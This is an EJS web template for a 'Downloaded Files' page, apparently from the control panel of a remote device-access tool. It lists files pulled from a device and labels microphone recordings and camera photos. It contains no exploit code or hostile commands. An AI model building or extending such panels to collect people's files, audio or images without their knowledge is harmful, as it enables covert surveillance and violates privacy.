<div class="card">
    <div class="card-header">
        <h2>💾 Downloaded Files</h2>
        <% if (data.list && data.list.length > 0) { %>
        <span class="hint"><%= data.list.length %> files</span>
        <% } %>
    </div>
    
    <% if (!data.list || data.list.length === 0) { %>
    <p class="empty">No files downloaded yet. Use the File Manager or other features to download files from the device.</p>
    <% } else { %>
    <div class="table-wrap">
        <table>
            <thead>
                <tr>
                    <th>Filename</th>
                    <th>Source</th>
                    <th>Downloaded</th>
                    <th></th>
                </tr>
            </thead>
            <tbody>
                <% data.list.slice().reverse().forEach((d, i) => { 
                    const ext = d.name?.split('.').pop()?.toLowerCase() || '';
                    const icon = ['mp3', 'mp4', 'm4a', 'wav'].includes(ext) ? '🎵' : 
                                 ['jpg', 'jpeg', 'png', 'gif'].includes(ext) ? '🖼️' :
                                 ['txt', 'log'].includes(ext) ? '📄' : '📁';
                %>
                <tr>
                    <td>
                        <div style="display: flex; align-items: center; gap: 0.5rem;">
                            <span><%= icon %></span>
                            <span><%= d.name %></span>
                        </div>
                    </td>
                    <td>
                        <% if (d.name?.includes('cam')) { %>
                        <span class="badge info">Camera</span>
                        <% } else if (d.name?.includes('mic')) { %>
                        <span class="badge info">Mic</span>
                        <% } else { %>
                        <span class="badge">File</span>
                        <% } %>
                    </td>
                    <td><%= new Date(d.time).toLocaleString() %></td>
                    <td>
                        <a href="<%= d.file %>" class="btn small primary" download="<%= d.name %>">⬇ Download</a>
                        <a href="<%= d.file %>" class="btn small" target="_blank">View</a>
                    </td>
                </tr>
                <% }) %>
            </tbody>
        </table>
    </div>
    <% } %>
</div>

<div class="card">
    <h2>ℹ️ About Downloads</h2>
    <p class="hint">Files downloaded from devices are stored on the server and can be accessed here. This includes:</p>
    <ul style="color: var(--muted); font-size: 0.9rem; margin-top: 0.5rem; padding-left: 1.5rem;">
        <li>Files from the File Manager</li>
        <li>Recorded audio from the Microphone</li>
        <li>Photos captured from the Camera</li>
    </ul>
</div>
